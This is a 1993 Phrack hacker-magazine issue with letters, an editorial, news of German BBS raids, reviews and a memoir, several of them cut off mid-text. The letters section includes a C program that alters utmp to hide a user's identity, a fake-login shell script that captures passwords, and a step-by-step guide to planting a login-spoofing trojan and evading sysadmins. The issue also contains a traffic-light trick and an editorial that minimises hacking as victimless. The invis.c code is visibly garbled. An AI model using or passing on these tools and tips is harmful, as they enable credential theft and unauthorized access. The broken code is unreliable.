        ~ Happy Anniversary Bill Cook & Tim Foley, we love you both! ~


Here it is.  Amidst all the fanfare and hoopla, Phrack 42 leaps from
your electronic mail box to infect your very soul.   It was just a few
short years ago on this day that one of the greatest abuses of
governmental authority took place in the happy little town of Austin,
Texas.  This issue marks the three year anniversary of these raids and a
hearty hello goes out to Bellcore, The United States Secret Service, and
the US District Attorney's Office.

As many of you have read previously, or otherwise heard through the
electronic grapevines, Dispater is no longer editor of Phrack.  Your
new editor, as I was most recently referred to so lovingly by
my long-time friend John Lee on the alt.cyberpunk Usenet group:
"the long hair and heavy metal beer drinking Texan that
Bruce Sterling finds so .. ahem.. 'attractive'."  In case you don't get
the joke, my name is Erikb, and I'm a hacker.

There are a few very distinct differences beginning with this issue of
Phrack.  First and foremost, Phrack is now registered with the Library
of Congress, and has its own ISSN.  Yes, boys and girls, you can
go to Washington, D.C. and look it up.  This adds a new era of
legitimacy to Phrack in that with such a registration, Phrack should
never again face any legal challenge that would bypass any paper
based magazine.

After much deliberation, I have concluded that Phrack
will no longer provide the world's anti-hacker corporate and
governmental types (IE: THE MAN) such valuable information for free.
This will of course have absolutely no effect on YOU, the hackers of the
world.  Phrack has always been, and will always continue to be yours to
copy and distribute amongst yourselves without limitation, as long as
the files retain unchanged and intact.

Entities who register their subscriptions to Phrack will be providing
valuable demographic information to Phrack and its readers on exactly
who outside our community actually takes an active interest in us.
Yes, it will also generate some income.  The proceeds of all monies
earned by Phrack will be used to actually compensate contributors for
articles of interest, and most importantly, help a certain person
pay off the debt incurred by the twist of fate dealt him through his
involvement with this publication in the past.  I have no interest in
making any money off of Phrack, as if I were to show a profit, I would
have to contribute to Tim Foley's expense account via the IRS and I have
absolutely no desire to fund his antics further than I am already
forced to.

To keep things honest, any information about the financial affairs
of Phrack will be made available to anyone who cares to write and
ask.  Thus, we can all see if "THE MAN" is truly as ethical as he would
have us believe, especially since our rate will be considerably
less than many magazines (or military screwdrivers).

Now, pertaining to "THE MAN."  Phrack does not care for you and the way
you secretly read and profit from Phrack and then use the information
contained within its files to oppress its publishers, contributors and
readers.  Henceforth, anyone involved with any ties to a computer
profession for any corporation, the military or the federal government,
any person with any ties for any telecommunications company, network
service provider or interconnect carrier, any person with any ties to
any law enforcement body, federal, state or otherwise, any elected
officials, attorneys, accountants or computer consultants of any kind
must register your subscription immediately.  If you are unsure of your
status with this regard, please contact us.  We are going to be VERY
liberal about "special dispensations" since it is not our intention to
screw anyone out of a subscription.

As many of you can imagine, this will be very hard to enforce.
This is not our main concern, as people who choose to ignore
this stipulation are in direct violation of applicable US
Copyright laws and therefore are just as unethical and guilty as
they have always claimed we are.

It would be an ironic turn of events should the FBI actually have to
conduct raids against companies like Bellcore for harboring illegal
copies of Phrack Magazine.  If, in your travels, you happen to see
such an occurrence, feel free to let us know. :)

Enjoy the magazine.  It is for and by the hacking community.  Period.

============================================================================
      !!!!WATCH THIS SPACE FOR SUMMERCON INFORMATION NEXT ISSUE!!!!
============================================================================

I 'found' this little C program a few days ago, and runs on most UNIX
machines I think (As I found it, I cant claim fame for writing it!).

What it does, is change your userid and x25 address to anything of your
choice. This only affects programs such as 'write' and 'who'. It doesn't
automatically give you different access rights, so it can only be used
to disguise your real identity.

Usage
-----

   inv god somewhere (Changes your uid to 'god' and X.25 to 'somewhere')
   inv ''  ''        (Makes you INVISIBLE on 'who')

Program invis.c
---------------

#include <stdio.h>
#include <utmp.h>
#include <sys/types.h>

#include <lastlog.h>

main(argc,argv)
int argc;
char *argv[];
{
 FILE *f;
 struct utmp u;

 int v=ttyslot(1);
 if(v==-1)
 {
  fprintf(stderr,"Can't find terminal.
");
  exit(1);

 if(argc!=3)
 {
  fprintf(stderr,"Args!
");
  exit(1);
 }
 f=fopen("/etc/utmp","r+");
 if(f==NULL)
 {
  fprintf(stderr,"Utmp has escaped!
");
  exit(1);
 }
 if(fseek(f,v*sizeof(u),0)==-1)
 {
  fprintf(stderr,"Garbage utmp
");
  exit(1);
 }
 if(fread((char *)&u,sizeof(u),1,f)!=1)
 {
  fprintf(stderr,"Write failed
");
  exit(1);
 }

 strncpy(u.ut_name,argv[1],8);
 strncpy(u.ut_host,argv[2],16);
 if(fseek(f,v*sizeof(u),0)==-1)
 {
  fprintf(stderr,"Seek failed
");
  exit(1);
 }
 fwrite((char *)&u,sizeof(u),1,f);
 fclose(f);
}

I personaly have not used this program (to hack or for anything else)
What you do with it is up to you....,

I am interested in getting in contact with hackers in Nord Italy
(I am located in Torino). Do you know anybody ?

Can you help TheNewHacker ??

Thanks

TheNewHacker

[Editor:  Actually, we are in the process of recruiting people to
          write for a compilation file on the hacking scenes in countries
          around the world.  One person is working on Italy.  Perhaps when
          this file is completed, you will be able to network through that
          information.
          If anyone in a country other than America is interested in
          contributing to this effort, please write us at:
          phrack@well.sf.ca.us !  ]

hello, i must say i love your publication.  I have a little kind of
hack/phreak for you guys.

When you approach a Red light, preferably at night with few cars around,
continually flash your bright lights.  This tricks the light into believing
this a cop waiting behind traffic at the light thus changing the light after
about 10 flashes.  I discovered that after seeing several police officers turn
on their lights before they hit lights and was amazed on how easily the light
changed.  If you have say, a Mag-lite the trick works if you point directly
at the top of the post-light and the ones hanging right above red on verticals
and right above yellow on horizontals.

hope this helps etc.   (i fucking hate those damn red lights)

Dave.

[Editor:  I've actually tried this.  It works on most major
          intersections]

-----------------------------------------------------------------------------

Hallo !
I'd like to make just some addition to the APPENDIX A of the
Racketeer's article "The POWER of Electronic Mail" - there are
new guys in InterNET -> Russians (!). They have the awful
connection, but it's cool team. So, add :

 .su           kremvax.hq.demos.su

And one more note, in the SMTP installed on the Sun Station I'm working
on there isn't command TICK, but exist some strange like RSET and
EXPN.
      Spy

  P.S. Sorry for my bad English.

[Editor:  Russia has a lot of computers online these days.  Look for
          more on the Russian Internet in upcoming Phracks!]

-----------------------------------------------------------------------------

There is another, much simpler way to expand your password collection,
other than tty spoofing. Why not just run a program that simulates the
login process, and then leave it running on the console for an unsuspecting
victim? A simple example is below. Execute by typing getpass:logout.

--------File: getpass----------
LOGIN=""
PASSWD=""
clear
echo -n "login: "
read LOGIN
echo "$LOGIN" >name
sleep 3
echo -n "Password:"
read PASSWD
echo "$PASSWD" >password
echo
echo -n "Login incorrect"
-------------------------------

The only problem I have is that I don't know how to make it so that
the password, when entered, isn't shown on the screen. I'm sure you
can come up with a solution.


[Editor:  actually, someone kinda did.  See the next letter]

A Better UNIX Password Grabber
by The K-Man


I blame it entirely on boredom.  Well, that and an acute case of end-
of-semester neural gridlock.  I was sitting in the lab a couple of years
ago, my head leaning against a Sparc-2 display, my index finger hitting the
return key over and over again at the login prompt.  It was all my mind and
body were capable of at the time.  Then a little thought formed in the back
of my mind: "You know, it would be pretty damn easy to write a program to
imitate the behavior of this screen while grabbing user id's and passwords."
So I logged in and started coding.  Then I thought to myself, "You know, with
a few extra lines of code and a couple of tricks, I could make this little
guy almost completely undetectable and untraceable while running."  So I
coded some more.  A couple of hours later, out popped the following
program:

HOW IT WORKS

You can probably figure this out by reading the code, but I thought I'd
just add some comments on why I did what I did.

The first thing is does is install the signal handler. All it does is trap
SIGINT, SIGSTP, and SIGQUIT, so that the person trying to log into the machine
this baby is running on can't kill it with a keystroke.  Next, it gets the
parent process ID.  We'll use this later to kill it off quickly.  Then it
proceeds to erase the executable file.  Sysadmins can't find a trojan horse
program that isn't there.

>From here it goes on to imitate the login and password prompts.  You'll
probably have to change the code to get it to imitate the login process on
your particular machine.

When it gets a userid and password, it appends them to an existing file in
the account.  I chose the .exrc, but any dot file will work.  The point being
to use a file that already exists and should be in the account.  Don't leave
any extra suspicious files lying around.

After it writes the uid and password to the file, it bumps the user back
to the real login prompt by killing off the shell that was the parent process
of the program.  The cut is almost instantaneous; the user would have to be
inhumanly observant to notice the transition.


HOW TO USE

Well, first you need an account to run it from.  If your site has guest accounts,
you've got it made.  If not, I'd suggest using a little social engineering to
get one other person's account.  With that account and the program, you can grab
access to many more.  I wouldn't recommend running it from an account that has
your name on it.  That just makes it a little more dangerous than it needs to be.
Of course, if the sysadmin happens to catch the program running on your login,
you can always claim to know nothing.  Say someone else must have gotten your
password and is using your account to escape detection.  He might buy it.  But
if you have the source for the program sitting somewhere in your account, and
they find it, you're fucked.  So it's best to use someone else's account for
the job.

After you've gotten the account you'll be running it from, you'll need to get
the program in that account somehow.  I started off by keeping a copy of the
source somewhere it my account, named with something innocuous and hidden
among bunches of source files, but I got paranoid and started hauling the source
around with me on a bar floppy.  Do whatever suits your level of paranoia.

Copy the source to the account you'll be running it from and compile it.
Trash the source, and name the program something that won't stand out in a
ps list.  selection_svc is a nice innocuous name, and it appears everywhere.
Do a ps on one of your machines and look for processes that hang around for
a long time.  You might want to hide it as a daemon.  Be creative.

Now run the program and sit back and wait.  Or leave and come back later.
When you know that someone has tried to log on to your booby trapped machine,
log back into the account you borrowed to run the program in and vi or emacs (if
you're that kind of person) out the captured userid and password.  Simple as
that.

Note that the two times that you stand the greatest chance of being caught
are when you first compile and run the program and when you retrieve your
captured uid and passwords.  There's the remote chance that someone might see
you at work and see what you're doing, but it's not very likely.  If you start
acting all paranoid you'll draw more attention to yourself than you would have
gotten in the first place.  If your site has dialup lines, you might want to do
a dialin to retrieve the passwords. Or you might prefer to do it in person.
All depends on your paranoia quotient which you think is more secure, I guess.


TIPS

Be careful which dot files you use.  I chose the .exrc because it was something
that wasn't used often at our site.  If you chose the .cshrc or other frequently
accessed file, put a # before the uid and password you write to that file.  That
way,  when that dot file is sourced, it'll treat that line as a comment and not
spit out an error message that could cause suspicion.

Try to run the program at a time when you know there will be heavy machine
usage.  That way you'll trap something quick.  The longer your program
runs, the greater the chance it will be found.

Don't be greedy.  Run on only one or two machines at a time.  And if you run
on more than one machine, run out of a different account on each one.  Again,
the more you put out there, the better the chance that at least one will be
found.


PARTING NOTE

The morning after I wrote this program was the first time I got to use it.  I
set it running on a guest account, the went to a machine across the room to
do some legitimate work.  One of my friends walks in shortly after that, and
we start shooting the shit.  A minute or two later, the sysadmin walks in, sits
down, and logs in to the machine I ran the program on.  I came really close to
dropping my fudge right then and there.  The only thing running through my
mind was "Either I'm totally fucked, or I have root."  Turned out it was choice
B.  Too bad the guy changed his password once a week, and I wasn't smart enough
to fix it so that I would see the change.  Oh well, I had fun for a week though.
There were quite a few interesting e-mail messages sent back and forth that week.
I think the best one was the one from our (male) department head to one of our
radical she-male hard-core no-damn-gifs feminist female professors, detailing
all the perverted sexual acts that he would like to perform with and on her. :)

Anyway, have fun with the program.  Maybe I'll get a chance to come up with
some more cool UNIX programs in the future.

        In a recent issue of PHRACK you had some article or loopback about
getting information about people via modem.  I am somewhat interested in
this and could use this information.  I have a friend who is a part-time
bounty hunter and could use such information to track people down.
Could you please send me some information about who to contact to find out
this information.  What I could REALLY use is an on-line up-to-date
phone/address book that I could call to find out anybody's address.  Is
there such a thing?  If you have any information please e-mail me, since I

I just saw a transcript of a press conference given by

here is a brief extraction...

FRERICKS: Um hm. This is a major nation wide, world wide problem from
an industry point of view with tremendous losses in funds tremendous
losses of money. the VAX account at the University is a way to get
into numerous other research accounts or Internet which is the ...you
get onto Internet you can talk to anybody else who is on Internet
anywhere in the world which these kids were talking to Belgium, and
Israel and Australia and they can do that just by this, thus avoiding
long distance phone calls.  But most of the people on Internet I mean
on the VAX are there legitimately for research purposes they can go to
Mayo and get a file if they're a med student and they also get one of
these pamphlets if they get, like the Department of Engineering gives
out an account number just for that semester, the professor would give
it out so you can use the VAX well they also get one of those
pamphlets that explains what the rules are and the instructor spends a
good bit of time the first couple of classes going over computer
etiquette, computer rules.

    I typed this because of the mention of Software Security International in
the article "More than $100,000 in Illegal Software Seized" in Rambone's
Pirates Cove in Phrack 41.
    He mentioned that they were the investigators that finally brought down
APL. I am not only familiar with that, a past friend of mine was
there when the Marshalls took the board. He was there as representative of
SSI.
 The best part that Rambone didn't know, was that they couldn't get into
APL to verify the existence of the software, until they got the password
breaker from Novell. So in essence, they looked like some dumb fools.
They didn't have any idea on how to approach the network.

That is of course if they finally have gotten off the ground. Last I Heard (2-3
months ago) they were still having trouble getting Financial Backing. They did
the APL Bust for nothing, just to prove they could do it. They are also on a

              Volume Four, Issue Forty-Two, File 2b of 14

                        [-=:< Editorial >:=-]

Before I jump upwards onto my soapbox and spew forth a meaty
editorial I would like to relay something to the readers of Phrack.
The following is a transcript of John Lee's  (Corrupt's) confession
to the charges facing him.  (From Security Insider Report, Jan. 1993)

What follows is in my opinion a very poor attempt at a plea-bargain,
and obviously induced by attorney coercion.  I must wonder what John
was thinking when he agreed to this admission.
======================================================================

I agreed with others to violate various laws related to the use of
computers.  I agreed to do the following:

1)  I agreed to possess in excess of fifteen passwords which
    permitted me to gain access to various computer systems
    including all systems mentioned in the indictment and others.
    I did not have authorization to access these systems.  I knew
    at the time that what I did was wrong.

2)  I used these access devices and in doing so obtained the value of time
    I spent within these systems as well as the value of the passwords
    themselves which I acknowledge was more than $1000.

3)  I intentionally gained access to what I acknowledge are Federal interest
    computers and I acknowledge that work had to be done to improve the
    security of these systems which was necessitated by my unauthorized
    access.

4)  I was able to monitor data exchange between computer systems and by
    doing so intentionally obtained more passwords, identifications and
    other data transmitted over Tymnet and other networks.

5)  I acknowledge that I and others planned to share passwords and
    transmitted information across state boundaries by modem or telephone
    lines and by doing so obtained the monetary value of the use of the
    systems I would otherwise have had to pay for.

Among the ways I and others agreed to carry out these acts are the following:

  1.  I was part of a group called MOD.

  2.  The members of the group exchanged information including passwords
      so that we could gain access to computer systems which we were not
      authorized to access.

  3.  I got passwords by monitoring Tymnet, calling phone company
      employees and pretending to be computer technicians, and using
      computer programs to steal passwords.

I participated in installing programs in computer systems that would give
the highest level of access to members of MOD who possessed the secret
password.

I participated in altering telephone computer systems to obtain
free calling services such as conference calling and free billing
among others.

Finally, I obtained credit reports, telephone numbers and addresses
as well as other information about individual people by gaining access
to information and credit reporting services.  I acknowledge that on
November 5, 1991, I obtained passwords by monitoring Tymnet.

I apologize for my actions and am very sorry for the trouble I have
caused to all concerned.

John Lee


==========================================================================


This issue I would like to call attention to what I consider to be
a very pressing issue.  There has always been a trend to pad the
amount of dollar damages incurred to any victim of a hacker attack.
I personally feel that the blame is never directed at the true guilty
parties.

Certainly, if someone is caught breaking into a system, then they are
surely guilty of some form of electronic trespass.  I will also
concede that such a person may or may not be guilty of other crimes
based upon their actions once inside that system.  What I have the
most problems dealing with is the trend to blame the hacker for any
expenditures needed to further secure the system.

With this mindset, why should any corporation bother to add any
security at all?  Why not just wait until someone happens across
a few poorly secured sites, nab them, and claim damages for the
much needed improvements in security?

The worst culprits in this type of behavior has been the RBOCs.  As was
seen with the supposed damages incurred for the distribution of the
"911 document" and most recently with the $370,000 damages supposedly
incurred by Southwestern Bell resulting from the alleged activities
of those in MOD.

Perhaps this figure does have some basis in reality, or perhaps it is
just an arbitrary figure dreamed up by a few accountants to be used
at year end to explain some losses in the corporate stock report.
Most often figures such as this factor in such ridiculous items as
the actual system hardware penetrated.  I can hardly see the relevance
of such a charge.

Even if these charges are to be believed, why isn't the blame being
evenly distributed?  Why aren't stockholders crying for the heads of
system administrators, MIS managers and CIOs?  These are the people who
have not adequately done their jobs, are they not?  If they had expended
a bit of time, and a small amount of capital, the tools exist to make
their systems impervious to attack.  Period.

If I had an investment in a company such as Southwestern Bell, I would be
outraged that the people I was employing to perform data security
functions were not apt enough to keep a group of uneducated gangsters
out of their switching systems.  Why haven't there been any emergency
meetings of shareholders?  Why isn't anyone demanding any changes in policy?
Why is everyone still employed?

Not to blame Southwestern Bell too harshly, they were sorely outclassed
by MOD, and had absolutely no way to cope with them.  Not only because MOD
were competent telco hackers, but because Southwestern Bell's network
service provider had given them free reign.

Southwestern Bell's packet switched network, Microlink II, was designed
and implemented for SWBT by Tymnet (then owned by McDonnell Douglas).
An interesting thing I've heard about SWBNET, and about every other subnet
arranged by Tymnet, is that the information concerning gateways, utilities,
locations of node code, etc., is purported to be located in various
places throughout Tymnet internal systems.  One such system, was described
to me as a TYMSHARE system that contained data files outlaying every subnet
on Tymnet, the mnemonics (username/password pair) to each utility, gateway,
and the ONTYME II mail access keys.

If this information is correct, then shouldn't Tymnet be called in to
acknowledge their role in the attacks on Southwestern Bell?

Let's say a Realtor sold you a house, but told you that he would be keeping
copies of all your keys so that he could help you with the maintenance.
Some time later, you notice that a few of your books have been read, but
nothing else is disturbed.  Later on you notice that your tv is on and your
bed is all messed up.  A week later your stereo is gone.  You set up a trap
and catch someone going into your house with your own key!  You find that
the burglars had made copies of all the keys held by your Realtor.  You
then find that the Realtor neglected to put the keys in a safe, and in fact
had left them lying around on the table in his back yard labeled with
the addresses they corresponded to.

Who would you be more upset with?  The individual who copied and used the
keys, or the Realtor for not providing the access to your valuables more
vigilantly?  I would personally be far more upset with the Realtor, for
if he had put the keys in a safe this event would have probably never
transpired.

I'm not saying that people who get caught for breaking into computer
systems should be let go, especially if they can be proven to be involved
in the sale of hacked information for a personal profit.  What I am saying
that if hackers are to be punished so vigorously for what I view as a
predominantly victimless crime, then everyone should have to line
up and take their fair share of the blame.

I think it's high time that the real blame be placed on the corporate
entities who seemingly refuse to acknowledge their role in these
break-ins.  Neglect of duties and lack of responsibility on the part
of the employees, the interconnect carriers, the data network providers,
the hardware vendors, etc. all play a key role in the problems that
exist in the world's data networks today.  In fact, if it were not for
computer hackers, these problems would continue to lie dormant until either
discovered by accident in the field, or the provider decided to go ahead
and illuminate its clients to the existence of such a problem.

I wholeheartedly encourage each and every reader of Phrack to
purchase one share of stock in any corporation you know that has exhibited
such tendencies and take your place on the floor of the next shareholders
meeting and scare the hell out of the board of directors.
Phrack Magazine is calling a discount brokerage very soon.

                          BBS Busts in Germany
                          ====================


Thursday, March 18, 1993.

This day will be remembered as a black day in German BBS history.
In fact, it was the blackest day in German BBS history since the raid
of 18 Berlin BBS in Berlin and North Germany a couple of months ago.

What has happened?  A couple of Bulletin Board Systems (BBS) have
been raided by the police.  All these BBS had "warez" online, illegal,
pirated, copyrighted Software - usually for PC/MSDOS and Amiga.
This time, most of these BBS were in Bavaria, South Germany.

Now let's take a closer look at the events:

One guy who got busted was MST, Sysop of Southern Comfort BBS
in Munich.  In fact, his board went offline 9 days before.
But he was so unlucky still having his computer and his warez.
He was even using his modem to trade warez at the very moment
the cops rang his doorbell.  Why did he go offline just so short
before he got busted?  His board had been running for over 1 year.

Here is the text file MST released about going offline:

THURSDAY 03-09-93 00:15
THE SOUTHERN COMFORT BBS IS CLOSED !
I AM NOT BUSTED OR ANYTHING LIKE THIS !
I CLOSED THE BBS COS OF PERSONAL REASONS AND
PERHAPS IT WILL BE OPENED AGAIN IN 1 OR 2 MONTH !
I HOPE YOU WOULD UNDERSTAND THIS DECISION BUT SCENE
IS NOT ALL WHAT LIFE CAN BE ALL USER ACCOUNTS STAY
ALIVE AND WILL BE HERE AT A NEW??? OPENING !

SO I SAY BYE TO THE SCENE FOR PERHAPS ONLY A SHORT TIME !

MST/RAZOR 1911

A couple of days later, MST was posting ads in local BBS to sell his
old equipment.  But obviously he wasn't fast enough.  Maybe this was
one of the reasons the cops busted him on March, 18.  They were afraid
he might get rid of his illegal software, so they hurried up to catch him!

He got busted at 10am this morning.  Three cops were knocking on his door,
until he opened.  They had a search warrant and confiscated all his
computer equipment, disks, modems...

Chris used to have a board until four months ago, and now trades for TDT and
other groups.  He was in school this morning.  His parents weren't home
either.  So the cops broke into his house, smashed the wooden door, and
seized all his equipment.  He is asked to speak to the Police this Tuesday.

Chris used to be one of the most active traders for PC warez in Germany.
He and his friend Michelangelo supported boards like Schizophrenia and
Beverly Hills, which they co-sysop'ed.  They were also known as the
'Beverly Hills Boys', a new German cracking group.

After Chris' bust, a couple of boards were affected:
Beverly Hills went offline.  Also the German Headquarters of the Beverly
Hills Boys, 'Twilight Zone', went offline.  Their sysops estimate at least
1-3 months offline time.

The other Munich BBS and their sysops were really scared after the bust
and took down their systems for an uncertain amount of time.

One of Germany's largest BBS, Darkstar in Augsburg, was a heaven for
every warez collector.  It had 8 modems hooked up (all US Robotics Dual
Standard 16.8) and one ISDN Line.

It had over 2 GB PC warez online, and over 7 GB offline on tapes, which
would be put online according to user' requests.

But then, March 18 arrived, and the dream was shattered.
Its sysop, Rider, who was happily calling boards the previous day,
had the most shocking experience in his life.  The cops came and
took his BBS.

And more..
Ego, co-sysop of a large German BBS, got busted.
Andy/Spreadpoint (ex-sysop) got busted.
And lots of others...

Unlike the US Secret Service, which delights in seizing all
electronic equipment, like stereos, TVs, VCRs, the German cops
were just after the computer hardware, especially the hard drives
and file servers.

They usually come with three or four people.  All of the search warrants
they were using were quite old, issued last December.

Who is behind those actions?
First of all the BSA, Business Software Association.  They
were also responsible for the recent raids of US Bulletin Boards.
In Germany they just announced actions against piracy and
bulletin boards.  The most active BSA Members are Microsoft and
Lotus Development.  Microsoft, Lotus and the BSA are all located
in Munich, Germany, home of German's most feared lawyer,
Guenther Freiherr von Gravenreuth.  This guy has been fighting
for years against piracy, young kids who copy games, and especially
bulletin board systems.  He is also affiliated with Ariolasoft, a huge
German distributor for game labels like Activision and others.

In the end, all I can say is:
Be aware, don't get caught and don't keep illegal stuff on your board!

involved in all sorts of alternative lifestyles and deviant subcultures.  We
are everywhere!  We felt that the government has done a great job of splitting
people up so that we do not identify with other minority groups anymore.  There
are so many causes now that we often do not talk to others not directly
involved in our chosen causes.  We believe that the methods used to catch
criminals are the same regardless of the crime and that much can be learned by
studying how crimes in general are prosecuted and how people's morals are
judged.  It is our mission to educate people so they begin to case more about
the world around them. Please join our efforts by subscribing, advertising your
business with us, and by spreading the word about what we're up to.

Review by Knight Lightning:

I recently received a copy of the premier issue of Gray Areas, dated Fall 1992
and with a cover price of $4.50 (US).  I was impressed with both the laser
quality of the printing, artwork, and graphics, as well as the topics and
content of the articles.

I would not characterize Gray Areas as a hacker magazine, but the subject did
come up in an interview with John Perry Barlow (one of the original founders of
the Electronic Frontier Foundation) where he discussed the EFF and its role in
defending civil liberties.

No, instead I think it is safe to say that Gray Areas pays a lot of attention
to the Grateful Dead.  Indeed the cover story is titled "Grateful Dead
Unauthorized Videos."  Additionally, there are several other articles
(including the John Barlow interview) that discuss varying aspects about the
Dead's history, their politics, and of course their music.  An advertisement
for the next issue of Gray Areas reveals that even more articles relating to
the Grateful Dead are on the way; so if you are a "Dead Head" you will probably
fall in love with this magazine!

However, the article that I appreciated most was "Zine Scene," a review of 163
alternative newsletters that included such familiar names as 2600, Hack-Tic,
Full Disclosure, and TAP; and others that I intend to take a look at like Iron
Feather's Journal and bOING bOING.  The zines reviewed here covered every topic
imaginable and I thought it was a great buffet for the mind to have such handy
directory (especially since Factsheet Five went defunct about a year ago).

Other interesting articles had to do with video, audio, and software piracy and
reviews of music and software.  I also enjoyed the great artwork found
throughout the magazine in the form of visual aids, comics, and advertisements.

If you are a fan of alternative music or the Grateful Dead, you'll be very
sorry if you don't subscribe immediately.  If you are interested in alternative
publications with more interesting points of view than Time or Newsweek then
you owe it to yourself to at least purchase a copy to check it out.

                    into a 16.8K HST Dual Standard"

If you have a USRobotics Sportster FAX modem, Ver 4.1, you can issue
the following commands to it to turn it into an HST 16.8K dual standard.
In effect, you add HST 16.8K to its V32.bis 14.4k capability.

ats11=40v1L3x4&h1&r2&b1e1b1&m4&a3&k3
atgw03c6,22gw05cd,2f
ats14=1s24=150s26=1s32=8s34=0x7&w

A very important item is the b1, which tells the modem to use
the 16.8K HST protocol.  If you do not set b1, when the Sportster
connects with another V32 modem it will go through the CCITT v.32
connect tones and you will not get a 16.8K connect.

If you do get an HST connect, you will not hear the "normal"
train phase--instead you will hear the HST negotiation which
sounds like a 2400 baud carrier.

Finally, if you change the "cd" in the second line to a "cb", your
modem will think it is a V.32 Courier instead of an HST 16.8K.

   Request to Post Office on Selling of Personal Information

    In May 1992, the US Postal Service testified before the US House of
 Representatives' Government Operations Subcommittee that National Change of
 Address (NCOA) information filled out by each postal patron who moves and
 files that move with the Post Office to have their mail forwarded is sold to
 direct marketing firms without the person's consent and without informing
 them of the disclosure. These records are then used to target people who
 have recently moved and by private detective agencies to trace people, among
 other uses. There is no way, except by not filling out the NCOA form, to
 prevent this disclosure.

    This letter is to request information on why your personal information
 was disclosed  and what uses are being made of it. Patrons who send in this
 letter are encouraged to also forward it and any replies to their
 Congressional Representative and Senators.


 Eligible requestors: Anyone who has filed a change of address notice with
 the Postal Service within the last five years.



 Records Officer
 US Postal Service

     If you look beneath the shiny surface of most things, and gaze way-way-way
deep down into the murky black festering heart of the human evolutionary
process, you are ultimately confronted with the revelation that has stood, nay,
LEAPT UP before the ancients since before the days of Atlantis:  Life is a lot
like NeW WaReZ.

     Anybody who tried to tell you something different, is obviously selling
you something.

     All things in this universe -- and many others -- can be attributed to New
WareZ.  The ebb and flow of WareZ is what keeps the very COSMOS from bursting
apart at the seams.  During periods of time when the flow of WareZ slows to a
trickle, times are tough, there is war, pestilence, death, disease, and many
rAg PhIleZ.  d()oDZ who were happily playing Ultima XXII Quest For Cash, are
soon busily hurling insults at each other and dialing the Secret Service.  Life
is grim, there is a bleak sense of desolation and emptiness . . . for when the
WareZ slow down . . . there is little left to live for and you begin to enter
withdrawal.  An ugly process that, thus far, has only been combatted
successfully by Wally Hills NeW WhErEZ Treatment center, where they slowly ween
you off the addiction of WareZ and introduce you to the REAL WORLD where you
can do things like smoke crack and play in a band.

     On the flipside, when there is a good steady flow of WaReZ, the universe
hums to itself in happiness and all wrongs are righted, perspectives
re-adjusted, and peace, love, and happiness spread throughout the land as the
COSMOS re-aligns itself and perfection sweeps the world.  This is a heady time,
but one that is sure to be brief, for before you know it some evil glimmer of
BADNESS will rise up and somebody will DOUBLE-RELEASE someone else, or a Ware
will CRASH when it tries to load . . . and then it's just all over.

     A long time ago in a galaxy far, far away . . . I was a founding member of
the Knights Of MysterIous keYboArdZ and the Ko0l/Ra{> alliance.  At present I
am President/Ce0 and Chairman of the b0red at Phantom Access
Technologies/Coleco ADAM design Studios, Inc.

     At the moment our group is working on a multi-tasking, multi-user,
CyberSpace environment where the participants can take part in a shared reality
that is based upon a cross-relational structure comprised of lots of 0's and
1's all strung together in big twisty chains and kept track of by an
Objective-COBOL X/Motif GUI sitting on an SQL dialed into the POWER COMPUTER in
Utah, at infinite baud (not to be confused with bps).

     In the near future I .plan to move to Pigs Knuckle Idaho and cross-breed
weasels with ferrets, while devoting the rest of my life to watching daytime
TV.

     It's just that type of thing.

Reality Break
~~~~~~~~~~~~~

     It is very difficult, bordering on impossible, for me to remain serious
for longer than about 45 seconds, when discussing the "underground" and what it
was all about.

     I rarely bother to mediate or water-down most of my opinions, and there
are a lotta places out there in the real world, where anyone who cares can
readily access whatever I have to say.  There isn't a great deal left for me to
convey to anybody regarding my perceptions of the hack/phreak world's history
and what it has meant, and shall mean, in the cosmic scheme of things.

     The first time I came into direct contact with computers was during the
mid-late 70's.  I was around 6 or 7 and my father worked at NCAR during this
period of time, which is a futuristic looking series of buildings in Boulder
Colorado.  This one time I came in, there were all these weird cars driving
around in the parking lot, and since there were frequently a lotta strange
things moving around there, I never understood until much later that Woody
Allen was filming SLEEPER when this was going on.  On the same day, I was shown
some of the computer rooms, which had just taken shipment on one of the first
Crays to go out the door.  This left an impression.  It was neato . . .

     One thing led to another.  I played around with various things, mainly the
really old Commodore PET systems and a slew of heavy metal junk from IBM, until
I got an Apple ][+ in 1978.  I hung out with a group of people who were also
starting to get into computers, most of them comprising the main attendees of
the soon-to-be-defunct TAP meetings in NYC, a pretty eclectic collection of
dudes who have long since gone their separate ways to meet with whatever
destinies life had in store for them.  Around 1980 there was an Apple Fest that
we went to, and found even more people with Apples and, from this, formed the
Apple Mafia, which was, in our minds, really cool sounding and actually became
the first WAreZ gRoUP to exist for the Apple ][.

     Time passed, I picked up more hardware, went on the quest to assemble the
perfect Apple-Cat system -- consisting of the Cat, 212 card, BSR, firmware,
tone decoder chip, and all the m0dZ NOVATION eventually made to the boardZ --
and ultimately ended up with 3 of 'em, one of which still works (like wow).
This led to the first generation of Phantom Access programs which started to
seep into the moDeM WeRlD around 1983, with the final revisions being let loose
in 1987 or 1988, under the auspices of Dead Lord.  By this time I had long
since stopped working on them and had relatively little to do with their forms
of release.

     Over the years I've been in a seemingly-endless succession of groups and
gatherings under nearly 50 different pseudonyms which were frequently invented
and dropped, all around that one specific timeslice and reference-point.  There
were only two that I was ever "serious" about, which is to say I entered into
them honestly believing the ideals and reasons for the group's inception, to be
valid and worth upholding and being a part of.  In other words I was in my
mid-teens and my attitude wasn't one of "Yeah yeah, take 10; a buncha dudes are
gonna screw around, some of it will be fun, some of it will be silly, and a lot
of it will be bitchy and cranky, but hey, I'm only here to amuse myself, so
what the fuck . . ."  The two "serious" affiliations were Apple Mafia and the
Knights of Shadow.  KOS ceased to exist in mid-1984 and I dropped out of the AM
around 1985, although to my knowledge it kept going until '86 or '87 when the
last surviving members found better things to do with their time.  In 1987 I
was also "OfFphICiALlLY" inducted into the Fraternal Order of the Legion of
Doom, which was just gosh w0wz0.  Actually, it's much more fun in retrospect,
since most of us are pretty good friends at this point in time, which seemed an
unlikely event back in the early 80's <giGgLE!!@#>

     I ceased to be "active" sometime around 1985, having gained legal access
to almost anything I could possibly want to play with, as well as having made
friends with people working for NYNEX who de-mystified many things for me.  The
ultimate conclusion to all of this was that having THE POWER is cool -- and
using it to annoy people was absolutely hilarious -- but only led to two
possible destinations.

     You use it all as a learning experience and "grow up" realizing that
you're playing cops and robbers, and many of the things you have spent years
doing are now illegal and liable to get you into a lot of trouble.  You can't
go back in time (at least not yet).

     You could keep doing stupid things and end up in a legal dilemma over
something that isn't very important.  Because . . . it really isn't "THE
POWER," it's just a very limited form of "it" embodied by a phone system and
